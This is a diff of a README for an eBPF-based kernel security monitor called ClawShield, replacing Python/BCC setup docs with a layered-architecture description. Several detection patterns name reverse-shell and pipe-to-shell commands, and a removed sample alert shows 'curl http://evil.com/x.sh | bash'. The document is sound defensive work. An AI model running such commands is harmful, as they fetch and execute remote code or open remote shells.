@@ -1,205 +1,85 @@
-# ClawShield eBPF Security Monitor
+# ClawShield eBPF Monitor (Layer 3)
 
-Kernel-level security monitoring using eBPF (Extended Berkeley Packet Filter). This module provides real-time detection of:
-
-- **Process Execution** - Suspicious command patterns, fork bombs
-- **Network Connections** - Port scanning, suspicious ports, unauthorized destinations
-- **File Access** - Sensitive file reads/writes (/etc/shadow, /etc/sudoers, SSH keys)
-- **Privilege Escalation** - setuid to root attempts
+Kernel-level security monitoring for ClawShield's defense-in-depth architecture.
 
 ## Architecture
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                     Linux Kernel                            │
-│  ┌─────────────┐ ┌─────────────┐ ┌─────────────┐           │
-│  │ execve()    │ │ connect()   │ │ openat2()   │ syscalls  │
-│  └──────┬──────┘ └──────┬──────┘ └──────┬──────┘           │
-│         │               │               │                   │
-│  ┌──────▼──────────────▼───────────────▼─────┐             │
-│  │              eBPF Probes (kprobes)        │             │
-│  └──────────────────────┬────────────────────┘             │
-└─────────────────────────┼───────────────────────────────────┘
-                          │ perf buffer
-              ┌───────────▼───────────┐
-              │  clawshield-ebpf      │
-              │  (Python + BCC)       │
-              │                       │
-              │  • Pattern matching   │
-              │  • Threshold checks   │
-              │  • Alert routing      │
-              └───────────┬───────────┘
-                          │
-        ┌─────────────────┼─────────────────┐
-        ▼                 ▼                 ▼
-   ┌─────────┐      ┌──────────┐     ┌───────────┐
-   │ Console │      │ Log file │     │ Telegram  │
-   └─────────┘      └──────────┘     └───────────┘
-```
+The eBPF monitor is Layer 3 of ClawShield's three-layer defense:
 
-## Requirements
+| Layer | Component | Purpose |
+|-------|-----------|---------|
+| 1 | Proxy + Scanners | Application-level request/response scanning |
+| 2 | iptables Firewall | Network-level egress filtering |
+| **3** | **eBPF Monitor** | **Kernel-level process/network/file monitoring** |
 
-- Linux kernel 4.4+ with BPF enabled
-- BCC (BPF Compiler Collection)
-- Python 3.8+
-- Root privileges (for eBPF loading)
+## Backends
 
-### Install BCC on Ubuntu/Debian
+### eBPF (Production)
+- CO-RE compiled eBPF programs via `cilium/ebpf`
+- No kernel headers required at runtime
+- Requires: Linux kernel 5.0+, BTF support, `CAP_BPF` or root
+- Attaches kprobes to: `execve`, `tcp_v4_connect`, `do_sys_openat2`, `setuid`
+
+### Procfs (Fallback)
+- `/proc` filesystem polling when eBPF is unavailable
+- Degraded but functional monitoring
+- Works in containers without `CAP_BPF`
+- Poll interval: 1 second (configurable)
+
+## Detections
+
+| Detection | Severity | Description |
+|-----------|----------|-------------|
+| Fork bomb | Critical | >50 new processes in 60s window |
+| Suspicious exec | High | Matches patterns: `curl\|sh`, `nc -e`, `bash -i`, etc. |
+| Privilege escalation | Critical | Process running as UID 0 (non-allowlisted) |
+| Sensitive file access | High | Access to `/etc/shadow`, `/etc/sudoers`, etc. |
+| Port scan | High | >20 unique destination ports in 60s |
+
+## Usage
 
 ```bash
-sudo apt install bpfcc-tools python3-bpfcc
+# Run with default settings
+./clawshield-ebpf
+
+# Custom socket path and poll interval
+./clawshield-ebpf -socket /var/run/clawshield/events.sock -poll-interval 2s
 ```
 
-## Quick Start
+## Graceful Degradation
 
-```bash
-# Run directly (development)
-sudo python3 cmd/clawshield-ebpf/main.py -c config/default.yaml
+At startup, the monitor checks eBPF availability:
 
-# Install as service
-sudo cp clawshield-ebpf.service /etc/systemd/system/
-sudo systemctl enable clawshield-ebpf
-sudo systemctl start clawshield-ebpf
+```
+[clawshield-ebpf] eBPF capability check: FAILED (kernel 4.19 < 5.0)
+[clawshield-ebpf] Falling back to procfs-based monitoring (degraded mode)
+[clawshield-ebpf] ProcFS monitor started (degraded mode: no eBPF)
 ```
 
-## Configuration
+The health check system reports Layer 3 as `degraded` when using procfs fallback.
 
-See `config/default.yaml` for all options:
+## Health Check
 
-```yaml
-# Enable/disable detectors
-detectors:
-  process_execution: true
-  network_connections: true
-  file_access: true
-  privilege_escalation: true
+The health system reports per-layer status:
 
-# Thresholds
-thresholds:
-  fork_bomb_threshold: 50   # Rapid child spawning
-  port_scan_threshold: 20   # Unique ports from single process
-
-# Allowlists (won't trigger alerts)
-allowlist:
-  processes:
-    - /usr/bin/apt
-    - /usr/bin/node
-
-# Suspicious patterns
-suspicious:
-  commands:
-    - "curl.*|.*sh"    # Pipe curl to shell
-    - "nc -e"          # Netcat reverse shell
-  files:
-    - /etc/shadow
-    - /etc/sudoers
-  network:
-    - 4444    # Metasploit default
-    - 31337   # Leet port
-```
-
-## Alerts
-
-### Console Output
-```
-[14:32:15] HIGH: Suspicious Command Execution
-  PID: 12345
-  Command: bash
-  Path: curl http://evil.com/x.sh | bash
-```
-
-### Telegram
-Alerts are sent to the configured Telegram chat with severity icons and markdown formatting.
-
-### Log File
-JSON-lines format at `/var/log/clawshield/ebpf.log`:
 ```json
-{"timestamp": "2026-02-09T14:32:15", "severity": "high", "title": "Suspicious Command Execution", "details": {...}}
+{
+  "overall": "degraded",
+  "layers": [
+    {"name": "proxy", "layer": 1, "status": "healthy"},
+    {"name": "firewall", "layer": 2, "status": "healthy"},
+    {"name": "ebpf", "layer": 3, "status": "degraded", "backend": "procfs",
+     "metrics": {"events_published": 142, "events_dropped": 0}}
+  ]
+}
 ```
 
-## Integration with ClawShield
+## Event Pipeline
 
-The eBPF monitor works alongside:
-- **clawshield-fw** (Firewall) - Network-layer egress blocking
-- **clawshield-proxy** (Proxy) - MCP traffic interception
+Events flow from the monitor to the proxy via Unix socket:
 
-Together they provide defense-in-depth:
-1. eBPF detects suspicious behavior at kernel level
-2. Firewall blocks unauthorized network destinations
-3. Proxy enforces policy on MCP tool calls
-
-### Cross-Layer Event Bus
-
-The eBPF monitor publishes security events to a Unix domain socket at `/tmp/clawshield-events.sock`. When the ClawShield proxy is running with `adaptive.enabled: true`, it listens on this socket and reacts to eBPF events automatically.
-
-**Events published by the eBPF monitor:**
-
-| Event Type | Trigger | Severity |
-|------------|---------|----------|
-| `exec_suspicious` | Suspicious command pattern or fork bomb | `high` / `critical` |
-| `port_scan` | Process connects to >20 unique ports | `medium` |
-| `file_access` | Access to `/etc/shadow`, `/etc/sudoers`, SSH keys | `high` |
-| `privesc` | Non-root process calls `setuid(0)` | `critical` |
-
-**Example adaptive reactions:**
-
-- `privesc` → Proxy elevates injection detection sensitivity to `high` for 5 minutes
-- `port_scan` → Proxy restricts domain allowlist for 10 minutes
-- `exec_suspicious` → Proxy tightens default policy to deny-by-default
-
-Events are sent as newline-delimited JSON over the Unix socket. The socket path can be configured in `config/default.yaml` under `alerts.event_socket`, or defaults to `/tmp/clawshield-events.sock`.
-
-If the proxy is not running, the eBPF monitor operates standalone — events are still logged to console, file, and Telegram as before.
-
-## Detectors
-
-### Process Execution (`trace_execve`)
-- Attaches to `__x64_sys_execve`
-- Detects: reverse shells, fork bombs, malicious scripts
-- Pattern matching on command arguments
-
-### Network Connections (`trace_connect`)
-- Attaches to `tcp_v4_connect`
-- Detects: port scanning, C2 ports, suspicious destinations
-- Tracks unique port counts per process
-
-### File Access (`trace_openat`)
-- Attaches to `do_sys_openat2`
-- Detects: shadow file reads, sudoers tampering, SSH key access
-- Monitors sensitive paths
-
-### Privilege Escalation (`trace_setuid`)
-- Attaches to `__x64_sys_setuid`
-- Detects: any non-root process calling setuid(0)
-- Critical severity alerts
-
-## Troubleshooting
-
-### "BPF not supported"
-```bash
-# Check kernel config
-zcat /proc/config.gz | grep BPF
-# Should show CONFIG_BPF=y, CONFIG_BPF_SYSCALL=y
+```
+Monitor (eBPF/procfs) → Unix socket → EventBus → AdaptiveController → Proxy overrides
 ```
 
-### "Cannot attach kprobe"
-```bash
-# Check available probes
-sudo bpftrace -l 'kprobe:*execve*'
-```
-
-### High CPU Usage
-Reduce buffer sizes in code or increase poll timeout:
-```python
-b["events"].open_perf_buffer(handler, page_cnt=16)  # Reduce from 64
-```
-
-## Development
-
-```bash
-# Quick test (one-liner)
-sudo python3 -c "from bcc import BPF; print('BCC works!')"
-
-# Run with debug output
-sudo python3 cmd/clawshield-ebpf/main.py -c config/default.yaml 2>&1 | tee debug.log
-```
+The event bus now tracks published and dropped events for pipeline health monitoring.
